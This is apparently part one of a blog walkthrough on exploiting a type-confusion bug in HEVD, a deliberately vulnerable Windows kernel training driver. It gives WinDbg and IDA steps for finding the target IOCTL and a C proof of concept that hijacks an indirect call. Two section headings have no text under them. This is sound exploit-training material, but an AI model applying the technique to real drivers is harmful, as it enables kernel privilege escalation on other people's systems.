[Home](https://plackyhacker.github.io) : [Part 2](https://plackyhacker.github.io/kernel/hevd-2) : [Part 3](https://plackyhacker.github.io/kernel/hevd-2)

# HEVD Type Confusion Walkthrough on Windows 2022

## Introduction

Why should we be interested in driver exploits? The answer to that is that on Windows architecture drivers execute their code in kernel space. This is very desirable for a threat actor, if there is a vulnerability in the driver code and it can be exploited it can be used to gain privilege escalation from user mode. This is because user mode can interact with kernel mode via drivers.

Chances are if you have taken an interest in kernel exploitation you have heard of the **Hacksys Extreme Vulnerable Driver**.

The [GitHub page](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) for the driver states "The HackSys Extreme Vulnerable Driver (HEVD) is a Windows Kernel driver that is intentionally vulnerable. It has been developed for security researchers and enthusiasts to improve their skills in kernel-level exploitation". I don't need to say anything else about this great resource.

At the time of writing, I am preparing to take the Advanced Windows Exploitation course by OffSec. I want to document my attempt to exploit the HEVD driver, using some slightly less common techniques than I have used before. Hiopefully this can help others too!

## Gathering Information

Typically the first stage in reverse engineering a driver is to understand how we can interact with it from user mode. Drivers register a **Symlink** which is effectively the ID used to communicate with the driver from user mode, they also register **dispatch routines**; in simple terms these are functions that execute the driver code when data is received from user mode. 

The next step involves kernel debugging. There are lots of resources online that describe how to do this.

I find that the easiest way to get these is to attach a debugger to the kernel of the lab machine (the machine that has the driver loaded) and run the following commands, some of the output has been omitted for brevity:

```
1: kd> .reload
Connected to Windows 10 20348 x64 target at (Sat Aug 17 14:51:12.146 2024 (UTC + 1:00)), ptr64 TRUE
Loading Kernel Symbols
...
1> kd> lm
...
fffff800`0e490000 fffff800`0e51c000   HEVD       (deferred)
...
1: kd> !drvobj \Driver\HEVD 2
...
1: kd> !drvobj \Driver\HEVD 2
...
[0e] IRP_MJ_DEVICE_CONTROL              fffff8000e515078	HEVD+0x85078
...
```

The `.reload` command deletes all symbol information for the modules and reloads these symbols as needed. This ensure that the `lm` command lists the target driver. The `!drvobj` extension displays detailed information about a `DRIVER_OBJECT`, which includes the dispatch routines that have been configured.

The HEVD driver has a lot of dispatch routines, the one we are interested in for now is `IRP_MJ_DEVICE_CONTROL` (for now notice the offset from the driver base address; this will come in handy very shortly: `HEVD+0x85078`). Drivers receive **I/O Control (IOCTL)** codes which are passed to this dispatch routine and processed. This is where we will look for vulnerabilities. We still need to find the **Symlink** and we need to understand which **IOCTLs** the driver supports, for this we will turn to IDA.

### Driver Setup

Loading the `HEVD.sys` file into IDA we can locate the `DriverEntry` function and examine the pseudocode (using the menu: `View > Open subviews > Generate` psuedocode):

```c
__int64 __fastcall DriverEntry(__int64 a1, __int64 a2)
{
  _security_init_cookie();
  return sub_8A000(a1, a2);
}
```

Here there is a call to another function, I renamed this function to `HEVDDriverSetup` and examined this function, I am interested in line 12 and line 25:

```c
// line 12
RtlInitUnicodeString(&DestinationString, L"\\Device\\HackSysExtremeVulnerableDriver");
// ...
// line 25
v2 = IoCreateSymbolicLink(&v5, &DestinationString);
```

This indicates that the **SymbolicLink** is `\Device\HackSysExtremeVulnerableDriver`. For now be aware that in our `C`\ `C++` code this is `\\.\HackSysExtremeVulnerableDriver`.

### IOCTLs

When developing a driver the developer will write something similar to the following to register the dispatch routines:

```c
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
{
  //...
  DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HEVDDeviceControl;
  // ...
}
```

In `C++` the `->` operator is used with pointers to access members (variables or methods) of an object, in this instance `DriverObject`. Effectively this code registers a new dispatch routine called `HEVDDeviceControl`. Notice from our **Windbg** output that `IRP_MJ_DEVICE_CONTROL` is equal to `0x0e` (go back and take a look). Let's go back to the `HEVDDriverSetup` pseudocode and pick out the bits we need:

```c
__int64 __fastcall HEVDDriverSetup(_QWORD *DriverObject)
{
  // ...
  // line 18
  memset64(DriverObject + 0xE, (unsigned __int64)sub_8574C, 0x1CuLL);
  DriverObject[0xE] = sub_85058;
  DriverObject[0x10] = sub_85058;
  DriverObject[0x1C] = sub_85078;
  DriverObject[0xD] = sub_85000;
  // ...
}
```

I have renamed `a1` to `DriverObject`. We can see that starting it an offset of `0x0e` some functions are being assigned to memory, these are the dispatch routines. If we add `0x0e` (the base offset), and `0x0e` which we believe to be our `IRP_MJ_DEVICE_CONTROL` dispatch function we get `0x1c`. If we follow this logic we end up at the following function:

```c
__int64 __fastcall sub_85078(__int64 a1, __int64 a2)
```

Within this function we can see debug messages that describe the types of vulnerabilities for each of the IOCTLs. The IOCTLs are being directed using a `switch`\ `case` block. In a real-world driver there may or may not be debug messages and you would have to do a bit of reverse engineering and testing to try and find bugs.

This is the IOCTL we are going to exploit:

```c
// line 107
case 0x222023:
  DbgPrintEx(0x4Du, 3u, "****** HEVD_IOCTL_TYPE_CONFUSION ******\n");
  v6 = HEVDTypeConfusion(a2, v2);
  v7 = "****** HEVD_IOCTL_TYPE_CONFUSION ******\n";
```

I have renamed the target function to `HEVDTypeConfusion` and the IOCTL we need is `0x222023`.

## The Vulnerability

### Follow the Code



## PoC

We can do some basic dynamic analysis to test our theory. The following code uses the `CreateFile` Win32 API to get a handle to the driver using the SymLink we obtained earlier. We define a character array of 16 bytes and send it to the driver using `DeviceIoControl`. Notice the parameters for this call; `hDriver` is a handle to the driver, `0x222023` is our target IOCTL, and `someData` is our test buffer:

```c
#include <stdio.h>
#include <Windows.h>

int main() {
    // get a handle to the driver
    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
        return 1;
    }

    char someData[] = {
        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
        0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42
    };

    DeviceIoControl(hDriver, 0x222023, (LPVOID)&someData, sizeof(someData), NULL, 0, NULL, NULL);
}
```

We can compile this code and copy it to the target lab. In our kernel debugger we can set a breakpoint on the instruction where we think the vulnerability is triggered:

```
1: kd> bp HEVD+8754B
1: kd> g
Breakpoint 1 hit
HEVD+0x8754b:
fffff800`0e51754b ff5308          call    qword ptr [rbx+8]
0: kd> dq rbx L2
ffffd286`5abf3fa0  41414141`41414141 42424242`42424242
```

Notice that when we run the exploit in our target lab, our breakpoint is hit. When we examine the two QWORDs pointed to by `rbx` we see our test buffer. This means we control what is executed by `call qword ptr [rbx+8]`.

## Type Confusion

## Next Steps

In the next post we will attempt to direct execution to malicious shellcode we control to escalate our privileges. To do this we need to overcome some Windows exploit mitigations, such as **SMEP**, **kASLR**, and **DEP**.

[Home](https://plackyhacker.github.io) : [Part 2](https://plackyhacker.github.io/kernel/hevd-2) : [Part 3](https://plackyhacker.github.io/kernel/hevd-2)
